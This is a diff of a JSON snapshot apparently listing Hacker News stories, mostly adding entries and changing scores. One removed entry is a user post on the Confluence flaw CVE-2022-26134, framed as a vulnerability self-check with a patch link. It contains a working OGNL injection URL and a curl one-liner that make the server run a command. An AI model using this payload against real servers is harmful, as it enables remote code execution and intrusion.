@@ -1,6 +1,26 @@
 {
   "stories": [
     {
+      "by": "prawn",
+      "descendants": 0,
+      "id": 31677180,
+      "score": 1,
+      "time": 1654744020,
+      "title": "As the Great Salt Lake Dries Up, Utah Faces an ‘Environmental Nuclear Bomb’",
+      "type": "story",
+      "url": "https://www.nytimes.com/2022/06/07/climate/salt-lake-city-climate-disaster.html"
+    },
+    {
+      "by": "pigtailgirl",
+      "descendants": 0,
+      "id": 31677179,
+      "score": 1,
+      "time": 1654743979,
+      "title": "The International Bathymetric Chart of the Southern Ocean Version 2",
+      "type": "story",
+      "url": "https://www.nature.com/articles/s41597-022-01366-7"
+    },
+    {
       "by": "feross",
       "descendants": 0,
       "id": 31677164,
@@ -33,7 +53,7 @@
       "by": "frisco",
       "descendants": 0,
       "id": 31677146,
-      "score": 1,
+      "score": 2,
       "time": 1654743468,
       "title": "Twitter plans to provide Elon Musk with access to the “firehose”",
       "type": "story",
@@ -71,33 +91,16 @@
     },
     {
       "by": "rntn",
-      "descendants": 0,
+      "descendants": 1,
       "id": 31677106,
-      "score": 4,
+      "kids": [
+        31677197
+      ],
+      "score": 5,
       "time": 1654742887,
       "title": "New unusual repeating fast radio burst detected 3B light-years away",
       "type": "story",
       "url": "https://lite.cnn.com/en/article/h_26ea5cd4b1a4542e4e9b91babcaad923"
-    },
-    {
-      "by": "behnamoh",
-      "descendants": 0,
-      "id": 31677096,
-      "score": 1,
-      "time": 1654742774,
-      "title": "The Common Lisp Cookbook",
-      "type": "story",
-      "url": "https://lispcookbook.github.io/cl-cookbook/"
-    },
-    {
-      "by": "kyoung3412",
-      "descendants": 0,
-      "id": 31677086,
-      "score": 2,
-      "text": "On 2022-06-03, New zero-day Vulnerability occured. CVE-2022-26134 is one of command injection vulnerability. According to Report, a zero-day attack that began during the Memorial Day holiday in the United States and attacker could exploit this CVE-2022-26134 vulnerability to upload a webshell.<p>You can see full report on this blog\nhttps:&#x2F;&#x2F;blog.criminalip.io&#x2F;2022&#x2F;06&#x2F;05&#x2F;criminal-ip-analysis-report-on-zero-day-vulnerability-in-atlassian-confluence&#x2F; .\nEDIT: Patch out: https:&#x2F;&#x2F;www.atlassian.com&#x2F;software&#x2F;confluence&#x2F;download-archives<p>If you are a Confluence user and you have access to Confluence through a browser on your PC, you can run the following command with a curl or python script to determine vulnerabilities of your Confluence server. Even if you are not an information security officer, there is a way to check vulnerabilities of your company’s Confluence. Try the following method and immediately request your security department for patches :<p>https:&#x2F;&#x2F;your_confluence_address&#x2F;${(#result=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(“id”).getInputStream(),”utf-8″)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(“X-Cmd-Response”,#result))}&#x2F;<p>If you change the part of your Confluence address, you can check it with curl as follows. If the uid, gid, and group of the Confluence server are displayed in the X-Cmd-Response header value, this server is considered to have CVE-2022-26134 vulnerability.<p>curl -v -k –head https:&#x2F;&#x2F;your_confluence_address&#x2F;%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D&#x2F; | grep X-Cmd-Response",
-      "time": 1654742655,
-      "title": "Zero-Day Vulnerability in Atlassian Confluence",
-      "type": "story"
     }
   ]
 }
